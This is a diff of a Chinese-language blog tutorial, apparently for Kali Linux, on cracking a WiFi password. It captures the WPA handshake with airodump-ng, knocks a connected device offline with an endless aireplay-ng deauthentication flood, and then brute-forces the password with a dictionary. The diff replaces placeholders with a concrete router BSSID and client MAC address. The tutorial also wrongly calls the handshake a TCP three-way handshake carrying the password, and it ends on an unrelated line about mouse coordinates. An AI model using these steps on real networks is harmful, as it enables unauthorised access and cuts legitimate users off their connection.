@@ -11,37 +11,38 @@ tags: [kali, WiFi渗透] # add tag
 
 #### 实现原理：进入kali系统，使用系统自带的Aircrack程序监听周围的热点，选择一个不错的WiFi热点然后对连接它的一台设备进行攻击，使其掉线，掉线后这台设备会自动重新连接，在连接的过程中设备会发送握手的数据包（当然也可以坐等设备连接当前WiFi热点，只要有设备在进行连接就会发送握手包），我们就可以利用伪装的挂载设备去获取这个握手包，最后就可以用密码字典文件去暴力破解获得密码。
 
-##### 1.建立监听热点机制
-
+#### 1.建立监听热点机制
 首先使用ifconfig/iwconfig命令查看无线网卡是否加载成功，如图出现wlan0无线设备即加载成功。（eth0是本机的以太网卡配置参数，wlan0是你的无线网卡名称，lo是回环接口）    
 ![Alt text](/assets/img/ifconfig.png)
 
 使用airodump-ng start命令开启无线网卡，此时无线网卡的名称将会变成wlan0mon
 ![Alt text](/assets/img/start.png)
 
-##### 2.监听WiFi热点
-
+#### 2.监听WiFi热点
 使用airodump-ng wlan0mon命令开始监听周围的WiFi热点，显示周围热点（ctrl+c 停止监听）
 ![Alt text](/assets/img/监听wifi信号.png)
 
+
 选取一个WiFi热点进行监听抓包（当有设备连入当前WiFi后就会抓取tcp握手包并存入保存路径内，坐等……）
 ```
-airodump-ng -c 频道(ch) --bssid WiFi的bssid -w 包存储的路径 网卡名
+airodump-ng -c 1 --bssid 48:0E:EC:7C:32:99 -w ~/a/ 网卡名
 -c  指定频道号(ch)
 --bssid  指定无线路由器的BSSID
 -w  指定获取的包存储的路径
 ```
 ![Alt text](/assets/img/监听wifi握手包.png)
 
+
 * 为了加速获取握手包可以选取一个连接当前WiFi的设备进行攻击，使用aireplay给其发送断开包，设备断开后就会进行自动重连
 ```
-aireplay-ng -0 攻击次数 -c 设备的mac地址 -a wifi的bssid 网卡名
+aireplay-ng -0 0 -c AC:88:FD:14:31:5B -a 48:0E:EC:7C:32:99 网卡名
 -0  表示发起攻击（deauthentication洪水攻击），后面指定攻击次数，设置0则为循环攻击，不停的攻击客户端将无法正常上网（ctrl+c停止）
 -c  指定强制断开的设备的mac地址
 -a  指定无线路由器的BSSID
 攻击原理：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），此时我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码
 ```
 ![Alt text](/assets/img/攻击.png)
+
 #### 3、字典暴力破解
 
 * 鼠标相对于当前屏幕的坐标    
